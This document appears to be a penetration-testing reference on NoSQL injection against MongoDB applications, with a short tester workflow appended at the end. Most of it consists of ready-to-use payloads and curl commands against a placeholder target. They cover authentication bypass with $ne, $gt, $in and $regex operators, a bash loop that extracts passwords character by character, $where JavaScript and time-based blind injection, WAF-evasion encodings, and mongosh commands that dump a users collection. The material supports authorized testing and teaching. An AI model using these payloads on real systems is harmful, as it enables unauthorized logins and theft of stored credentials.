---
id: PS-NOSQLI
category: NoSQL injection
wstg_refs: [WSTG-INPV-05]
lab_count: 4
---

# NoSQL Injection: Attack Technique Reference

## 1. Detection

### 1A. Identifying NoSQL Backends

**Indicators of MongoDB or other NoSQL databases:**
- JSON-based API endpoints (application/json request bodies)
- Error messages mentioning MongoDB, Mongoose, CouchDB, Cassandra, DynamoDB
- ObjectId-format IDs (24-character hex strings like `507f1f77bcf86cd799439011`)
- Node.js/Express backend (common MongoDB pairing)
- Response structures with `_id` fields

### 1B. Initial Fuzz Strings

Inject into every parameter (GET, POST, JSON body, cookies) and observe errors or behavioral changes:
```
'
"
\
;
{
}
$ne
$gt
$where
||1==1
'||'1'=='1
```

**JSON body fuzz (for API endpoints):**
```json
{"username": {"$gt": ""}}
{"username": "'\"\\;{}$ne"}
```

**URL parameter fuzz:**
```
?search='
?search[$ne]=test
?id=1'
```

### 1C. Behavioral Detection

Send pairs of requests that should produce different results if NoSQL operators are interpreted:
```json
// Should return data (condition always true)
{"username": {"$ne": "nonexistent_user_xyz"}}

// Should return nothing (condition always false)
{"username": {"$eq": "nonexistent_user_xyz"}}
```

If the first returns data and the second does not, operator injection is confirmed.

## 2. Techniques

### 2A. Operator Injection (Syntax Injection)

MongoDB query operators can be injected through JSON bodies or URL parameters to manipulate query logic. This is the NoSQL equivalent of SQLi boolean-based injection.

> Lab refs: PS-NOSQLI-01

**JSON body injection:**
```json
// Original: {"username": "admin", "password": "unknown"}
// MongoDB query: db.users.find({username: "admin", password: "unknown"})

// Injected: match any password that is not empty
{"username": "admin", "password": {"$ne": ""}}

// Injected: match any password greater than empty string
{"username": "admin", "password": {"$gt": ""}}

// Injected: match password in a list (won't match, but $nin inverts)
{"username": "admin", "password": {"$nin": []}}
```

**URL parameter injection (when backend parses bracket syntax):**
```
POST /login
username=admin&password[$ne]=invalid

GET /users?role[$ne]=admin
GET /search?age[$gt]=0
```

**curl examples:**
```bash
# JSON body operator injection
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}' \
  https://target.com/api/login

# URL parameter operator injection
curl -sk -X POST \
  -d 'username=admin&password[$ne]=invalid' \
  https://target.com/login
```

### 2B. Authentication Bypass

The most impactful operator injection — bypass login without knowing any credentials.

> Lab refs: PS-NOSQLI-02

**Login as any user (JSON):**
```json
{"username": "admin", "password": {"$ne": ""}}
```

**Login as first user in database (JSON):**
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

**Login as specific user with regex (JSON):**
```json
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

**Login as admin regardless of username format (JSON):**
```json
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}
```

**URL-encoded variants:**
```
username=admin&password[$ne]=x
username[$ne]=nobody&password[$ne]=x
username[$regex]=^admin&password[$ne]=x
username[$in][]=admin&username[$in][]=root&password[$ne]=x
```

**curl commands for auth bypass:**
```bash
# Bypass with $ne operator
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}' \
  https://target.com/api/login

# Login as first user in DB
curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' \
  https://target.com/api/login

# URL parameter style
curl -sk -X POST \
  -d 'username=admin&password[$ne]=x' \
  https://target.com/login
```

### 2C. Data Extraction via Operator Injection

Use `$regex` operator to extract data character-by-character through boolean-based blind enumeration.

> Lab refs: PS-NOSQLI-03, PS-NOSQLI-04

**Password extraction (character by character):**
```json
// Test if password starts with 'a'
{"username": "admin", "password": {"$regex": "^a"}}
// Test if password starts with 'b'
{"username": "admin", "password": {"$regex": "^b"}}
// ... continue through charset

// Once first char found (e.g., 's'), test second char
{"username": "admin", "password": {"$regex": "^sa"}}
{"username": "admin", "password": {"$regex": "^sb"}}
// ... continue until full password extracted
```

**Determine password length:**
```json
{"username": "admin", "password": {"$regex": "^.{1}$"}}
{"username": "admin", "password": {"$regex": "^.{2}$"}}
{"username": "admin", "password": {"$regex": "^.{3}$"}}
// ... increment until match found
```

**Extract unknown field names using $where:**
```json
{"username": "admin", "$where": "Object.keys(this)[0].match('^.{0}a.*')"}
{"username": "admin", "$where": "Object.keys(this)[0].match('^.{0}b.*')"}
// ... enumerate field names character by character
```

**Automated extraction script pattern:**
```bash
CHARSET="abcdefghijklmnopqrstuvwxyz0123456789"
KNOWN=""

for pos in $(seq 0 30); do
  for c in $(echo "$CHARSET" | fold -w1); do
    RESP=$(curl -sk -o /dev/null -w '%{http_code}' -X POST \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^${KNOWN}${c}\"}}" \
      https://target.com/api/login)
    if [ "$RESP" = "200" ]; then
      KNOWN="${KNOWN}${c}"
      echo "Found: $KNOWN"
      break
    fi
  done
done
echo "Password: $KNOWN"
```

**Extracting unknown field names:**
```json
// Enumerate what fields exist on the user object
{"username": "admin", "$where": "Object.keys(this).length == 4"}
// Found: 4 fields. Now extract names:
{"username": "admin", "$where": "Object.keys(this)[2].match('^r.*')"}
// Found field starting with 'r' — continue to extract 'resetToken', etc.
```

### 2D. Server-Side JavaScript Injection ($where)

The `$where` operator executes JavaScript expressions in MongoDB. When user input reaches a `$where` clause, arbitrary JavaScript can be injected.

> Lab refs: PS-NOSQLI-03, PS-NOSQLI-04

**Boolean-based detection via $where:**
```json
// Always true
{"$where": "1==1"}

// Always false
{"$where": "1==2"}
```

**Data extraction via $where + match():**
```json
// Extract password character by character
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"$where": "this.username == 'admin' && this.password.match(/^b/)"}

// Check if field contains digits
{"$where": "this.password.match(/\\d/)"}
```

**Time-based blind injection:**
```json
// If condition is true, sleep 5 seconds
{"$where": "this.username == 'admin' && sleep(5000)"}

// Conditional time delay for data extraction
{"$where": "if(this.username == 'admin' && this.password.match(/^a/)){sleep(5000)}"}
```

**curl for time-based blind:**
```bash
# Measure response time — if >5s, condition was true
time curl -sk -X POST -H "Content-Type: application/json" \
  -d '{"$where":"if(this.username==\"admin\"&&this.password.match(/^s/)){sleep(5000)}"}' \
  https://target.com/api/users

# Alternative: use curl timing
curl -sk -X POST -H "Content-Type: application/json" \
  -o /dev/null -w '%{time_total}' \
  -d '{"$where":"if(this.username==\"admin\"&&this.password.match(/^s/)){sleep(5000)}"}' \
  https://target.com/api/users
```

## 3. MongoDB Operator Reference

| Operator | Meaning | Injection Use |
|----------|---------|---------------|
| `$ne` | Not equal | Match any value except specified (`{"$ne":""}`) |
| `$gt` | Greater than | Match any non-empty value (`{"$gt":""}`) |
| `$lt` | Less than | Match values less than specified |
| `$gte` | Greater than or equal | Similar to `$gt` |
| `$lte` | Less than or equal | Similar to `$lt` |
| `$in` | Value in array | Match against list (`{"$in":["admin","root"]}`) |
| `$nin` | Value not in array | Match anything not in list |
| `$regex` | Regular expression | Character-by-character extraction (`{"$regex":"^a"}`) |
| `$exists` | Field exists | Check if field present (`{"$exists":true}`) |
| `$where` | JavaScript evaluation | Full JS execution (`"this.password.length > 5"`) |
| `$or` | Logical OR | Combine conditions |
| `$and` | Logical AND | Combine conditions |
| `$not` | Logical NOT | Negate condition |

## 4. Detection vs. Exploitation Progression

### Stage 1: Detect (Safe)
```json
// Boolean pair — compare responses
{"field": {"$ne": "CANARY_VALUE_12345"}}  // should match (true)
{"field": {"$eq": "CANARY_VALUE_12345"}}  // should not match (false)
```

### Stage 2: Confirm Operator Processing
```json
// $regex should match if operators are processed
{"field": {"$regex": ".*"}}

// $exists should return records where field exists
{"field": {"$exists": true}}
```

### Stage 3: Authentication Bypass (if login endpoint)
```json
{"username": "admin", "password": {"$ne": ""}}
```

### Stage 4: Data Extraction
```json
// Regex-based enumeration
{"username": "admin", "password": {"$regex": "^<char>"}}
```

### Stage 5: JavaScript Injection (if $where supported)
```json
{"$where": "this.username == 'admin' && this.password.match(/^<char>/)"}
```

## 5. Tool Reference

### nosqli
```bash
# Automated NoSQL injection scanner
nosqli scan -t https://target.com/api/login -d '{"username":"test","password":"test"}'

# With custom headers
nosqli scan -t https://target.com/api/login \
  -d '{"username":"test","password":"test"}' \
  -H "Content-Type: application/json" \
  -H "Cookie: session=abc123"
```

### nosql-injection-cli
```bash
# Interactive NoSQL injection tool
python3 nosql-injection-cli -u https://target.com/api/login \
  --data '{"username":"test","password":"test"}' \
  --content-type json
```

### mongosh (for post-exploitation)
```bash
# Connect to exposed MongoDB instance
mongosh mongodb://target.com:27017

# Enumerate databases
show dbs

# Dump users collection
use app_database
db.users.find().pretty()
```

## 6. WAF Bypass Patterns

**URL encoding of operators:**
```
password[$ne]=  →  password%5B%24ne%5D=
password[$gt]=  →  password%5B%24gt%5D=
```

**Unicode escaping in JSON:**
```json
{"password": {"\u0024ne": ""}}
{"password": {"\u0024regex": "^a"}}
```

**Mixed case (some parsers):**
```json
{"password": {"$Ne": ""}}
{"password": {"$NE": ""}}
```

**Alternative to $where:**
```json
// mapReduce-based injection (MongoDB)
{"$where": "function(){return this.password.match(/^a/);}"}
```
## Rynix workflow

1. `get_technique_guide` for `nosql-injection` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `sql-injection-cli plugin`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `sql-injection-cli plugin`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

